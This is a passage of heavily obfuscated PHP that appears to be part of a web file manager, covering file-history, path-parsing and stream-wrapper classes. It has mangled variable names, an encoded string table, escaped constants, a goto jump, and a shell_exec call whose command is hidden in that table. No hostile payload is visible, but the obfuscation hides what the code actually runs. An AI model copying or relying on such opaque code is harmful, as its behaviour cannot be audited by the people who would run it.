$ÎáçÏö¥[$ç¢œÀ¨ˆ[32]]; $Äù©İ¸ = IO::copy($‘ñÙÁİ˜, IO::pathFather($¦—å Òñ), REPEAT_REPLACE, $ ıŞ§î—[$ç¢œÀ¨ˆ[32]]); if ($Äù©İ¸) { self::remove($¦—å Òñ, $ää‚«áç); } return $Äù©İ¸; } } return !1; } public static function setDetail($üÃØÑŸª, $–¸ƒíç•, $Œ¶¢æÇ°) { $°Íõ =& $_SERVER[Ü©»’·]; $¥Ë³ÉùÎ = self::listData($üÃØÑŸª); if (!$¥Ë³ÉùÎ) { return; } foreach ($¥Ë³ÉùÎ[$°Íõ[378]] as $Ìß„¥– => $ÓÆÖ–Ô²) { if ($ÓÆÖ–Ô²[$°Íõ[408]] == $–¸ƒíç•) { $¥Ë³ÉùÎ[$°Íõ[378]][$Ìß„¥–][$°Íõ[1246]] = $Œ¶¢æÇ°; self::saveData($¥Ë³ÉùÎ[$°Íõ[1248]], $¥Ë³ÉùÎ[$°Íõ[378]]); return !0; } } return !1; } public static function fileInfo($Œ‚ú«ò, $³ùìŒ©Õ) { $÷¶ì“ « =& $_SERVER[Ü©»’·]; $®£€„®Ó = self::listData($Œ‚ú«ò); if (!$®£€„®Ó) { show_json(LNG($÷¶ì“ «[105]), !1); } $‘Ã×²ˆ = $÷¶ì“ «[12]; foreach ($®£€„®Ó[$÷¶ì“ «[378]] as $Ïé†½üÁ => $Ÿ¥òÛ‡“) { if ($Ÿ¥òÛ‡“[$÷¶ì“ «[408]] != $³ùìŒ©Õ) { continue; } $‘Ã×²ˆ = $®£€„®Ó[$÷¶ì“ «[1247]] . $Ÿ¥òÛ‡“[$÷¶ì“ «[32]]; break; } if (!$‘Ã×²ˆ) { show_json(LNG($÷¶ì“ «[105]), !1); } return IO::info($‘Ã×²ˆ); } public static function fileOut($øïòÂÖ, $ú²äØèÛ, $£ËôÁı· = false) { $ÍÛ³œ¶½ =& $_SERVER[Ü©»’·]; $á¸œÓ‚ı = self::fileInfo($øïòÂÖ, $ú²äØèÛ); $ªôŠ¨–ô =& $GLOBALS[$ÍÛ³œ¶½[7]]; $£ËôÁı· = isset($ªôŠ¨–ô[$ÍÛ³œ¶½[1198]]) && $ªôŠ¨–ô[$ÍÛ³œ¶½[1198]] == 1; if (isset($ªôŠ¨–ô[$ÍÛ³œ¶½[33]]) && $ªôŠ¨–ô[$ÍÛ³œ¶½[33]] == $ÍÛ³œ¶½[1249]) { return IO::fileOutImage($á¸œÓ‚ı[$ÍÛ³œ¶½[84]], $ªôŠ¨–ô[$ÍÛ³œ¶½[1250]]); } IO::fileOut($á¸œÓ‚ı[$ÍÛ³œ¶½[84]], $£ËôÁı·, get_path_this($øïòÂÖ)); } public static function listData($ºŠûùÀ‡, $İŞ§‡“ß = true) { $°¡©”äÛ =& $_SERVER[Ü©»’·]; if ($İŞ§‡“ß && !IO::exist($ºŠûùÀ‡)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($ºŠûùÀ‡, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $›ï°³ÓÒ = self::pathHistory($ºŠûùÀ‡); $”±·†° = array($°¡©”äÛ[1248] => $›ï°³ÓÒ . $°¡©”äÛ[1235], $°¡©”äÛ[1247] => rtrim(get_path_father($›ï°³ÓÒ), $°¡©”äÛ[8]) . $°¡©”äÛ[8], $°¡©”äÛ[378] => array()); $¾Ã“§ŒÁ = IO::getContent($”±·†°[$°¡©”äÛ[1248]]); if ($¾Ã“§ŒÁ) { $†ÙÃú¡Ø = json_decode($¾Ã“§ŒÁ, !0); if (is_array($†ÙÃú¡Ø)) { $”±·†°[$°¡©”äÛ[378]] = $†ÙÃú¡Ø; } } return $”±·†°; } private static function saveData($…Ìé…¤‹, $ªÉÅ‚À) { $·¤úäúÁ =& $_SERVER[Ü©»’·]; self::log($·¤úäúÁ[1251] . $…Ìé…¤‹ . $·¤úäúÁ[71] . count($ªÉÅ‚À), $·¤úäúÁ[758]); if ($ªÉÅ‚À) { return IO::setContent($…Ìé…¤‹, json_encode($ªÉÅ‚À)); } $×–¨öÓ = IO::pathFather($…Ìé…¤‹); IO::remove($…Ìé…¤‹); self::clearEmptyFolder($×–¨öÓ); return !0; } public static function clearEmptyFolder($‹Ó…èÖ«) { $Í†´ğÌà =& $_SERVER[Ü©»’·]; if (trim($‹Ó…èÖ«, $Í†´ğÌà[8]) == trim(self::$_historyBase, $Í†´ğÌà[8])) { return; } $·ë¨½°Ï = IO::pathFather($‹Ó…èÖ«); $á±‹×ç = IO::has($‹Ó…èÖ«, !0); if ($á±‹×ç[$Í†´ğÌà[207]] > 0 || $á±‹×ç[$Í†´ğÌà[208]] > 0) { return; } IO::remove($‹Ó…èÖ«); self::clearEmptyFolder($·ë¨½°Ï); } private static function getBasePath() { $İñ˜ˆº… =& $_SERVER[Ü©»’·]; $„¬è¸¦ = Model($İñ˜ˆº…[1252])->get($İñ˜ˆº…[1253]); if ($„¬è¸¦) { if (!IO::exist($„¬è¸¦)) { IO::mkdir($„¬è¸¦); } if (get_path_this($„¬è¸¦) == $İñ˜ˆº…[1238]) { $â°•Ÿ´ı = $İñ˜ˆº…[1254] . rand_string(8); @rename($„¬è¸¦, get_path_father($„¬è¸¦) . $İñ˜ˆº…[8] . $â°•Ÿ´ı); $„¬è¸¦ = DATA_PATH . $â°•Ÿ´ı . $İñ˜ˆº…[8]; file_put_contents(DATA_PATH . $İñ˜ˆº…[1188], $İñ˜ˆº…[12]); Model($İñ˜ˆº…[1252])->set($İñ˜ˆº…[1253], $„¬è¸¦); } return $„¬è¸¦; } $„¬è¸¦ = DATA_PATH . $İñ˜ˆº…[1254] . rand_string(8) . $İñ˜ˆº…[8]; $„¬è¸¦ = IO::mkdir($„¬è¸¦); $„¬è¸¦ = rtrim($„¬è¸¦, $İñ˜ˆº…[8]) . $İñ˜ˆº…[8]; file_put_contents($„¬è¸¦ . $İñ˜ˆº…[1188], $İñ˜ˆº…[12]); file_put_contents(DATA_PATH . $İñ˜ˆº…[1188], $İñ˜ˆº…[12]); Model($İñ˜ˆº…[1252])->set($İñ˜ˆº…[1253], $„¬è¸¦); return $„¬è¸¦; } } class KodIO { const KOD_SOURCE = "\173\163\x6f\x75\162\x63\x65\175"; const KOD_USER_RECYCLE = "\x7b\165\163\145\x72\122\x65\143\171\143\154\145\175"; const KOD_USER_FAV = "\173\x75\163\145\x72\x46\141\x76\x7d"; const KOD_USER_FILE_TAG = "\173\x75\x73\x65\162\x46\151\154\145\124\x61\147\x7d"; const KOD_USER_FILE_TYPE = "\x7b\165\x73\145\x72\106\151\x6c\145\124\x79\x70\x65\175"; const KOD_GROUP_ROOT_SELF = "\173\x67\162\x6f\x75\x70\x52\x6f\157\x74\x53\x65\x6c\146\175"; const KOD_USER_SHARE = "\x7b\x75\x73\145\162\x53\150\x61\162\145\x7d"; const KOD_USER_SHARE_LINK = "\x7b\165\x73\145\162\123\150\141\162\x65\114\151\156\153\175"; const KOD_USER_SHARE_TO_ME = "\x7b\163\150\141\x72\x65\124\x6f\115\x65\175"; const KOD_SHARE_ITEM = "\x7b\163\x68\x61\162\x65\111\x74\145\x6d\175"; const KOD_SHARE_LINK = "\173\x73\150\x61\x72\145\x49\164\x65\x6d\114\151\156\x6b\175"; const KOD_SEARCH = "\173\x73\145\x61\x72\143\x68\x7d"; const KOD_BLOCK = "\x7b\142\154\x6f\143\x6b\175"; const KOD_IO = "\x7b\x69\157\175"; const KOD_USER_RECENT = "\x7b\x75\163\x65\x72\x52\145\156\143\x65\156\164\x7d"; const KOD_USER_DRIVER = "\173\144\162\151\x76\145\x72\x7d"; public static function typeList() { $¯’’ÒÔÙ =& $_SERVER[Ü©»’·]; return array($¯’’ÒÔÙ[1255] => self::KOD_SOURCE, $¯’’ÒÔÙ[1256] => self::KOD_USER_RECYCLE, $¯’’ÒÔÙ[1257] => self::KOD_USER_FAV, $¯’’ÒÔÙ[1258] => self::KOD_USER_FILE_TAG, $¯’’ÒÔÙ[1259] => self::KOD_USER_FILE_TYPE, $¯’’ÒÔÙ[1260] => self::KOD_GROUP_ROOT_SELF, $¯’’ÒÔÙ[1261] => self::KOD_USER_SHARE, $¯’’ÒÔÙ[1262] => self::KOD_USER_SHARE_LINK, $¯’’ÒÔÙ[1263] => self::KOD_USER_SHARE_TO_ME, $¯’’ÒÔÙ[1264] => self::KOD_SHARE_ITEM, $¯’’ÒÔÙ[1265] => self::KOD_SHARE_LINK, $¯’’ÒÔÙ[1266] => self::KOD_SEARCH, $¯’’ÒÔÙ[1267] => self::KOD_BLOCK, $¯’’ÒÔÙ[1268] => self::KOD_IO, $¯’’ÒÔÙ[1269] => self::KOD_USER_RECENT, $¯’’ÒÔÙ[1270] => self::KOD_USER_DRIVER); } public static function parse($ˆ¬¶¯ò¯) { $¹«èé‰ı =& $_SERVER[Ü©»’·]; $ˆ¬¶¯ò¯ = self::clear($ˆ¬¶¯ò¯); $»Œ¥€şñ = array_values(self::typeList()); preg_match($¹«èé‰ı[1271], $ˆ¬¶¯ò¯, $ÊÕÉ£è£); $İæ¶Ë–ƒ = array($¹«èé‰ı[431] => !1, $¹«èé‰ı[1272] => !1, $¹«èé‰ı[428] => !1, $¹«èé‰ı[84] => $ˆ¬¶¯ò¯, $¹«èé‰ı[1173] => !1, $¹«èé‰ı[1172] => $¹«èé‰ı[12]); if (is_array($ÊÕÉ£è£) && count($ÊÕÉ£è£) == 5) { $˜’Øøµ¯ = $¹«èé‰ı[1273] . $ÊÕÉ£è£[2] . $¹«èé‰ı[327]; if (in_array($˜’Øøµ¯, $»Œ¥€şñ)) { $İæ¶Ë–ƒ[$¹«èé‰ı[1173]] = $ÊÕÉ£è£[1]; $İæ¶Ë–ƒ[$¹«èé‰ı[33]] = $˜’Øøµ¯; $İæ¶Ë–ƒ[$¹«èé‰ı[1274]] = substr($˜’Øøµ¯, 1, -1); $İæ¶Ë–ƒ[$¹«èé‰ı[408]] = $ÊÕÉ£è£[3]; } $İæ¶Ë–ƒ[$¹«èé‰ı[1172]] = $ÊÕÉ£è£[4]; } $Š¯æû·æ = array($¹«èé‰ı[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $İæ¶Ë–ƒ[$¹«èé‰ı[1237]] = in_array($İæ¶Ë–ƒ[$¹«èé‰ı[33]], $Š¯æû·æ); return $İæ¶Ë–ƒ; } public static function isTruePath($ññö¿ê¹) { $é•şÅÅ¦ =& $_SERVER[Ü©»’·]; if (substr($ññö¿ê¹, 0, 1) != $é•şÅÅ¦[1273]) { return !0; } if (strpos($ññö¿ê¹, $é•şÅÅ¦[417]) === 0) { return !0; } if (strpos($ññö¿ê¹, $é•şÅÅ¦[1241]) === 0) { return !0; } if (strpos($ññö¿ê¹, $é•şÅÅ¦[1275]) === 0) { return !0; } if (strpos($ññö¿ê¹, $é•şÅÅ¦[1276]) === 0) { return !0; } if (strpos($ññö¿ê¹, $é•şÅÅ¦[1277]) === 0) { return !0; } return !1; } public static function clear($³Ò¡×) { $ãİ²´Ú» =& $_SERVER[Ü©»’·]; $³Ò¡× = str_replace(array($ãİ²´Ú»[1081], $ãİ²´Ú»[231]), $ãİ²´Ú»[53], $³Ò¡×); $³Ò¡× = str_replace($ãİ²´Ú»[97], $ãİ²´Ú»[8], $³Ò¡×); $ŠÍ×©ş = $ãİ²´Ú»[1278]; if (substr($³Ò¡×, 0, 3) == $ãİ²´Ú»[1279]) { $³Ò¡× = substr($³Ò¡×, 3); } while (strstr($³Ò¡×, $ŠÍ×©ş)) { $³Ò¡× = str_replace($ŠÍ×©ş, $ãİ²´Ú»[8], $³Ò¡×); } $³Ò¡× = preg_replace($ãİ²´Ú»[1280], $ãİ²´Ú»[8], $³Ò¡×); if ($³Ò¡× == $ãİ²´Ú»[8]) { return $ãİ²´Ú»[8]; } $³Ò¡× = rtrim($³Ò¡×, $ãİ²´Ú»[8]); return $³Ò¡×; } public static function sourceID($ÎûÙö‡ò) { $ğãÍÅ” =& $_SERVER[Ü©»’·]; $¿ŞæØĞã = self::parse($ÎûÙö‡ò); if ($¿ŞæØĞã[$ğãÍÅ”[33]] !== self::KOD_SOURCE) { show_json(LNG($ğãÍÅ”[1281]), !1); } return $¿ŞæØĞã[$ğãÍÅ”[408]]; } public static function make($¡œ¡½³) { if (!$¡œ¡½³) { return !1; } return self::makePath(self::KOD_SOURCE, intval($¡œ¡½³)); } public static function makeShare($å»Ò¹Â¾, $ß•ìà‹Ş) { return self::makePath(self::KOD_SHARE_ITEM, $å»Ò¹Â¾, $ß•ìà‹Ş); } public static function makeFileTypePath($ÁÍáö¨ù) { return self::makePath(self::KOD_USER_FILE_TYPE, $ÁÍáö¨ù); } public static function makeFileTagPath($¼«ªÎ†) { return self::makePath(self::KOD_USER_FILE_TAG, $¼«ªÎ†); } public static function makePath($³ï»åì, $¡ó×ÒËÇ = '', $·û¦ûßÏ = '') { $ÊÆÛ€ù =& $_SERVER[Ü©»’·]; $À¢ä¬Ô£ = substr($³ï»åì, 1, -1); $¡ÈÒù = $ÊÆÛ€ù[1282] . $À¢ä¬Ô£ . $ÊÆÛ€ù[1283] . $¡ó×ÒËÇ . $ÊÆÛ€ù[1284]; $¡ÈÒù = $·û¦ûßÏ ? $¡ÈÒù . $·û¦ûßÏ . $ÊÆÛ€ù[8] : $¡ÈÒù; return $¡ÈÒù; } public static function hashPath($ÇòŞÁ›ë, $ğ¹´ùÇ¸ = true) { $ûÔìŞ™é =& $_SERVER[Ü©»’·]; $î•’ÚÅ´ = is_array($ÇòŞÁ›ë) ? $ÇòŞÁ›ë : IO::info($ÇòŞÁ›ë); $ŞÈ´‰ÌÌ = _get($î•’ÚÅ´, $ûÔìŞ™é[1285], $ûÔìŞ™é[12]); if (!$ŞÈ´‰ÌÌ && isset($î•’ÚÅ´[$ûÔìŞ™é[411]])) { $î•’ÚÅ´ = IO::info(KodIO::make($î•’ÚÅ´[$ûÔìŞ™é[411]])); $ŞÈ´‰ÌÌ = _get($î•’ÚÅ´, $ûÔìŞ™é[1285], $ûÔìŞ™é[12]); } if (!$ŞÈ´‰ÌÌ && $ğ¹´ùÇ¸) { $ÆÂã¶¥ = KodIO::parse($î•’ÚÅ´[$ûÔìŞ™é[84]]); if (!$ÆÂã¶¥[$ûÔìŞ™é[33]]) { $ŞÈ´‰ÌÌ = IO::hashSimple($î•’ÚÅ´[$ûÔìŞ™é[84]]); } } if (!$ŞÈ´‰ÌÌ) { $ŞÈ´‰ÌÌ = md5($î•’ÚÅ´[$ûÔìŞ™é[84]] . $î•’ÚÅ´[$ûÔìŞ™é[76]] . $î•’ÚÅ´[$ûÔìŞ™é[85]]); } return $ŞÈ´‰ÌÌ; } public static function hashPathSafe($¹¶Î‚²‡, $Õ° «èõ = true) { $×äç…Ø’ =& $_SERVER[Ü©»’·]; $ØÆÊÛÚ­ = self::hashPath($¹¶Î‚²‡, $Õ° «èõ); return md5($ØÆÊÛÚ­ . $×äç…Ø’[1286] . Model($×äç…Ø’[776])->get($×äç…Ø’[777])); } public static function initSystemPath() { $ÍëÉÂï =& $_SERVER[Ü©»’·]; if (defined($ÍëÉÂï[1287])) { return; } define($ÍëÉÂï[1287], self::systemPath($ÍëÉÂï[1288])); define($ÍëÉÂï[1289], self::systemPath($ÍëÉÂï[1290])); define($ÍëÉÂï[1291], self::systemPath($ÍëÉÂï[1292])); define($ÍëÉÂï[1293], self::systemPath($ÍëÉÂï[1294])); IOHistory::bindEvent(); } public static function systemPath($ŸáÈõ—ì) { $ÓõÂà¶‘ =& $_SERVER[Ü©»’·]; $òÙÇÛ¯˜ = $ÓõÂà¶‘[1295] . ucfirst($ŸáÈõ—ì); $ÔÒÁ¤Ò­ = Model($ÓõÂà¶‘[776])->get($òÙÇÛ¯˜); if ($ÔÒÁ¤Ò­) { return $ÔÒÁ¤Ò­; } if ($ŸáÈõ—ì == $ÓõÂà¶‘[1288]) { $ÔÒÁ¤Ò­ = self::make(Model($ÓõÂà¶‘[831])->systemRootPathAdd($ÓõÂà¶‘[553])); } else { $ÔÒÁ¤Ò­ = self::systemPath($ÓõÂà¶‘[1288]); $Ë²„Ø½ = self::sourceID($ÔÒÁ¤Ò­); $ÔÒÁ¤Ò­ = self::make(Model($ÓõÂà¶‘[831])->mkdir($Ë²„Ø½, $ŸáÈõ—ì)); } Model($ÓõÂà¶‘[776])->set($òÙÇÛ¯˜, $ÔÒÁ¤Ò­); return $ÔÒÁ¤Ò­; } public static function systemFolder($ÖÃÛàÄ¤) { $ËÄ…„ØÄ = IO_PATH_SYSTEM_SOURCE . $ÖÃÛàÄ¤; $­ÒÅİşØ = Cache::get($ËÄ…„ØÄ); if (!$­ÒÅİşØ) { $û§â—± = IO::infoFull($ËÄ…„ØÄ); if (!$û§â—±) { $­ÒÅİşØ = IO::mkdir($ËÄ…„ØÄ, REPEAT_SKIP); } else { $­ÒÅİşØ = $û§â—±[$_SERVER[Ü©»’·][84]]; } Cache::set($ËÄ…„ØÄ, $­ÒÅİşØ, 3600 * 10); } return $­ÒÅİşØ; } public static function defaultDriver() { return Model($_SERVER[Ü©»’·][773])->defaultDriver(); } public static function defaultIO() { $æğìÚ‡ =& $_SERVER[Ü©»’·]; $í­†•¤ = self::defaultDriver(); return $æğìÚ‡[1296] . $í­†•¤[$æğìÚ‡[408]] . $æğìÚ‡[1284]; } public static function defaultDriverInit() { static $ï¥€ã·Õ = false; if ($ï¥€ã·Õ) { return $ï¥€ã·Õ; } $ï¥€ã·Õ = IO::init(self::defaultIO()); return $ï¥€ã·Õ; } public static function fileTypeList() { $ÎÆ±ã’„ =& $_SERVER[Ü©»’·]; $ãğ‚ùÌ¤ = $GLOBALS[$ÎÆ±ã’„[6]][$ÎÆ±ã’„[1297]]; foreach ($ãğ‚ùÌ¤ as $öúŸ¨š => $æÃ²éš’) { $¯é¥õÌó = $ÎÆ±ã’„[1298] . $öúŸ¨š; $ƒ·¢²¿ = LNG($¯é¥õÌó); if ($¯é¥õÌó != $ƒ·¢²¿) { $ãğ‚ùÌ¤[$öúŸ¨š][$ÎÆ±ã’„[32]] = $ƒ·¢²¿; } } return $ãğ‚ùÌ¤; } public static function diskList($ÜÇò§ø× = true) { $¨ ©‡´é = $_SERVER[Ü©»’·][1299]; if ($ÜÇò§ø×) { $¬Ö§¥¬‘ = Cache::get($¨ ©‡´é); if (is_array($¬Ö§¥¬‘)) { return $¬Ö§¥¬‘; } } $¬Ö§¥¬‘ = self::diskListGet(); Cache::set($¨ ©‡´é, $¬Ö§¥¬‘, 60); return $¬Ö§¥¬‘; } public static function diskListGet() { $Ìüˆß²£ =& $_SERVER[Ü©»’·]; $‹Ê²í¤  = array(); if ($GLOBALS[$Ìüˆß²£[6]][$Ìüˆß²£[1300]] == $Ìüˆß²£[1301]) { $Í³îÆƒ = $Ìüˆß²£[1302]; for ($ Ù¤¨•ê = 0; $ Ù¤¨•ê < strlen($Í³îÆƒ); $ Ù¤¨•ê++) { $Ë×˜ÚğÈ = $Í³îÆƒ[$ Ù¤¨•ê] . $Ìüˆß²£[1303]; if (file_exists($Ë×˜ÚğÈ)) { $‹Ê²í¤ [] = $Ë×˜ÚğÈ; } } return $‹Ê²í¤ ; } if (!function_exists($Ìüˆß²£[98])) { $‹Ê²í¤ [] = $Ìüˆß²£[841]; return $‹Ê²í¤ ; } $ÅÓå–ÚÃ = explode($Ìüˆß²£[231], shell_exec($Ìüˆß²£[1304])); array_shift($ÅÓå–ÚÃ); array_pop($ÅÓå–ÚÃ); $Şé—éáí = array($Ìüˆß²£[1305], $Ìüˆß²£[1306], $Ìüˆß²£[1307], $Ìüˆß²£[1308], $Ìüˆß²£[1309], $Ìüˆß²£[1310], $Ìüˆß²£[1311], $Ìüˆß²£[1312]); foreach ($ÅÓå–ÚÃ as $ÇºË—™ú) { $åÍ’íè¸ = preg_split($Ìüˆß²£[1313], $ÇºË—™ú); $Ë×˜ÚğÈ = $åÍ’íè¸[count($åÍ’íè¸) - 1]; if (!strstr($åÍ’íè¸[0], $Ìüˆß²£[1314]) || !$Ë×˜ÚğÈ) { continue; } $£Ò¥­Ğî = rtrim($Ë×˜ÚğÈ, $Ìüˆß²£[8]) . $Ìüˆß²£[8]; if (in_array($£Ò¥­Ğî, $Şé—éáí)) { continue; } $‹Ê²í¤ [] = $£Ò¥­Ğî; } return $‹Ê²í¤ ; } public static function isSameDisk($„˜üóå¹, $è—¡§Âı) { $ ‚ƒ—¹Ø =& $_SERVER[Ü©»’·]; if ($GLOBALS[$ ‚ƒ—¹Ø[6]][$ ‚ƒ—¹Ø[1300]] == $ ‚ƒ—¹Ø[1301]) { return strtolower(substr($„˜üóå¹, 0, 1)) == strtolower(substr($è—¡§Âı, 0, 1)); } $¼í§¦ê¥ = self::diskList(); $¨…å–ÆÈ = !1; $şôÍ€¿Ü = !1; sort($¼í§¦ê¥); $¼í§¦ê¥ = array_reverse($¼í§¦ê¥); $„˜üóå¹ = rtrim($„˜üóå¹, $ ‚ƒ—¹Ø[8]) . $ ‚ƒ—¹Ø[8]; $è—¡§Âı = rtrim($è—¡§Âı, $ ‚ƒ—¹Ø[8]) . $ ‚ƒ—¹Ø[8]; foreach ($¼í§¦ê¥ as $¢¥óŸ¥Û) { $õ…Ş‡Ã = strlen($¢¥óŸ¥Û); if (!$¨…å–ÆÈ && substr($„˜üóå¹, 0, $õ…Ş‡Ã) == $¢¥óŸ¥Û) { $¨…å–ÆÈ = $¢¥óŸ¥Û; } if (!$şôÍ€¿Ü && substr($è—¡§Âı, 0, $õ…Ş‡Ã) == $¢¥óŸ¥Û) { $şôÍ€¿Ü = $¢¥óŸ¥Û; } if ($¨…å–ÆÈ && $şôÍ€¿Ü) { break; } } return $¨…å–ÆÈ === $şôÍ€¿Ü; } public static function transferType($ü‡²ı™£, $«Ç±õÖ) { $µÍ²Š× =& $_SERVER[Ü©»’·]; $›Ì¯…ªó = self::driverType($ü‡²ı™£); $ß¬ù‹ = self::driverType($«Ç±õÖ); if ($›Ì¯…ªó[$µÍ²Š×[33]] == $ß¬ù‹[$µÍ²Š×[33]] && $›Ì¯…ªó[$µÍ²Š×[1315]] == $ß¬ù‹[$µÍ²Š×[1315]]) { return $µÍ²Š×[1316]; } if ($›Ì¯…ªó[$µÍ²Š×[33]] == $µÍ²Š×[874] && $ß¬ù‹[$µÍ²Š×[33]] == $µÍ²Š×[106]) { return $µÍ²Š×[1198]; } if ($›Ì¯…ªó[$µÍ²Š×[33]] == $µÍ²Š×[106] && $ß¬ù‹[$µÍ²Š×[33]] == $µÍ²Š×[874]) { return $µÍ²Š×[107]; } return $µÍ²Š×[1317]; } public static function driverType($’ªé‘ÈÕ) { $Ö€ô¡¥İ =& $_SERVER[Ü©»’·]; $•àŠœª‡ = str_replace($Ö€ô¡¥İ[1318], $Ö€ô¡¥İ[12], strtolower($’ªé‘ÈÕ->getType())); if ($•àŠœª‡ == $Ö€ô¡¥İ[764] || $•àŠœª‡ == $Ö€ô¡¥İ[1319] || $•àŠœª‡ == $Ö€ô¡¥İ[1320]) { $’ªé‘ÈÕ = self::defaultDriverInit(); } else { if ($•àŠœª‡ == $Ö€ô¡¥İ[1208] || $•àŠœª‡ == $Ö€ô¡¥İ[1321]) { $’ªé‘ÈÕ = IO::init($’ªé‘ÈÕ->pathParse[$Ö€ô¡¥İ[1154]]); } } $ğşëöïÜ = $’ªé‘ÈÕ->path; $•àŠœª‡ = str_replace($Ö€ô¡¥İ[1318], $Ö€ô¡¥İ[12], strtolower($’ªé‘ÈÕ->getType())); if ($•àŠœª‡ == $Ö€ô¡¥İ[106]) { return array($Ö€ô¡¥İ[33] => $Ö€ô¡¥İ[106], $Ö€ô¡¥İ[1315] => $Ö€ô¡¥İ[12], $Ö€ô¡¥İ[84] => $ğşëöïÜ); } return array($Ö€ô¡¥İ[33] => $Ö€ô¡¥İ[874], $Ö€ô¡¥İ[1315] => $’ªé‘ÈÕ->pathDriver, $Ö€ô¡¥İ[84] => $ğşëöïÜ); } public static function pathDriverType($‚‹Î·äë) { return $‚‹Î·äë ? self::driverType(IO::init($‚‹Î·äë)) : !1; } } goto DÒò³…Ï™·; cé«¡Ìãâ: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($ıèÑ¨–‹, $ûƒ±Œùñ = '') { $this->info = $this->info($ıèÑ¨–‹); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[Ü©»’·][84]]; $this->pathOpen = $ıèÑ¨–‹; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$ıèÑ¨–‹])) { self::$_chunkBuffer[$ıèÑ¨–‹] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($ƒ•øÎ˜«) { $ó‡âÕÆ¥ = $this->fileSubstr($this->pose, $ƒ•øÎ˜«); $this->pose += strlen($ó‡âÕÆ¥); return $ó‡âÕÆ¥; } public function stream_tell() { return $this->pose; } public function stream_seek($¨öı„ù, $ğÁÁ›ú¿) { $Šõ¦ËÌõ =& $_SERVER[Ü©»’·]; if ($ğÁÁ›ú¿ == SEEK_SET) { $this->pose = $¨öı„ù; } else { if ($ğÁÁ›ú¿ == SEEK_CUR) { $this->pose += $¨öı„ù; } else { if ($ğÁÁ›ú¿ == SEEK_END) { $this->pose = $this->info[$Šõ¦ËÌõ[76]] + intval($¨öı„ù); } } } if ($¨öı„ù < 0) { $this->pose = $this->info[$Šõ¦ËÌõ[76]] + $¨öı„ù; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[Ü©»’·][76]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($äÇ­§šô, $±Öë›») { $òùÎÚØÌ =& $_SERVER[Ü©»’·]; $İëá’ö = $this->info($äÇ­§šô); return array($òùÎÚØÌ[1516] => 0, $òùÎÚØÌ[1517] => 0, $òùÎÚØÌ[16] => 32768 + 511, $òùÎÚØÌ[1518] => 0, $òùÎÚØÌ[1519] => 0, $òùÎÚØÌ[1520] => 0, $òùÎÚØÌ[1521] => 0, $òùÎÚØÌ[76] => $İëá’ö[$òùÎÚØÌ[76]], $òùÎÚØÌ[1522] => $İëá’ö[$òùÎÚØÌ[1389]], $òùÎÚØÌ[1477] => $İëá’ö[$òùÎÚØÌ[85]], $òùÎÚØÌ[1476] => $İëá’ö[$òùÎÚØÌ[200]], $òùÎÚØÌ[1523] => 0, $òùÎÚØÌ[1524] => 0); } static $fileInfo = array(); public function info($ˆºïĞºË) { $ÎÂáƒ« = $_SERVER[Ü©»’·][1525]; if (isset(self::$fileInfo[$ˆºïĞºË])) { return self::$fileInfo[$ˆºïĞºË]; } if (substr($ˆºïĞºË, 0, strlen($ÎÂáƒ«)) != $ÎÂáƒ«) { return !1; } self::$fileInfo[$ˆºïĞºË] = IO::info(substr($ˆºïĞºË, strlen($ÎÂáƒ«))); return self::$fileInfo[$ˆºïĞºË]; } public static function read($É¶ÄÄ¦ö, $‰­í¾âö, $§± ü‰) { if (!isset(self::$_fopenCache[$É¶ÄÄ¦ö])) { $ì¡é‰ÉÉ = new StreamWrapperIO(); $ì¡é‰ÉÉ->stream_open($É¶ÄÄ¦ö); self::$_fopenCache[$É¶ÄÄ¦ö] = $ì¡é‰ÉÉ; } $ì¡é‰ÉÉ = self::$_fopenCache[$É¶ÄÄ¦ö]; return $ì¡é‰ÉÉ->fileSubstr($‰­í¾âö, $§± ü‰); } public static function _read($¸“˜Ğöõ, $‰ÍÀ¶×—, $ÈĞÂÇÉš) { $¯õ¯±¸à =& $_SERVER[Ü©»’·]; $œÏŒ¿ñ = fopen($¸“˜Ğöõ, $¯õ¯±¸à[1393]); if (!$œÏŒ¿ñ) { return $¯õ¯±¸à[12]; } $ˆ·ÕòÛ = 8192; fseek($œÏŒ¿ñ, $‰ÍÀ¶×—, SEEK_SET); $Òç±«¾¼ = $¯õ¯±¸à[12]; $¼ñºğø– = 0; while ($¼ñºğø– < $ÈĞÂÇÉš) { $‹óƒ¹§ = min($ˆ·ÕòÛ, $ÈĞÂÇÉš - $¼ñºğø–); $Òç±«¾¼ .= fread($œÏŒ¿ñ, $‹óƒ¹§); $¼ñºğø– += $‹óƒ¹§; } fclose($œÏŒ¿ñ); return $Òç±«¾¼; } public function fileSubstr($³üƒË–ş, $¶·•ç­ª) { $×Ëú‹Œ =& $_SERVER[Ü©»’·]; $ŒÇ‹ı­³ = $this->info[$×Ëú‹Œ[76]]; $Ú­»òŒŞ = $³üƒË–ş; $¨¨‹ û = $¶·•ç­ª; if ($³üƒË–ş < 0) { $³üƒË–ş = $ŒÇ‹ı­³ + $³üƒË–ş; } if ($¶·•ç­ª === !1) { $¶·•ç­ª = $ŒÇ‹ı­³ - $³üƒË–ş; } if ($³üƒË–ş + $¶·•ç­ª > $ŒÇ‹ı­³) { $¶·•ç­ª = $ŒÇ‹ı­³ - $³üƒË–ş; } if ($¶·•ç­ª <= 0) { return $×Ëú‹Œ[12]; } if ($³üƒË–ş < 0 || $³üƒË–ş >= $ŒÇ‹ı­³ || $¶·•ç­ª <= 0 || $¶·•ç­ª > 1024 * 1024 * 10) { throw new Exception("\x69\x6f\x46\151\154\x65\x52\145\x61\x64\40\x65\x72\162\157\162\41\x20\163\x74\141\x72\x74\75{$³üƒË–ş}\73\154\145\x6e\147\164\x68\x3d{$¶·•ç­ª}\73\40\163\x69\172\145\x3d{$ŒÇ‹ı­³}\73"); } $—íõ¶Ö‰ = 64 * 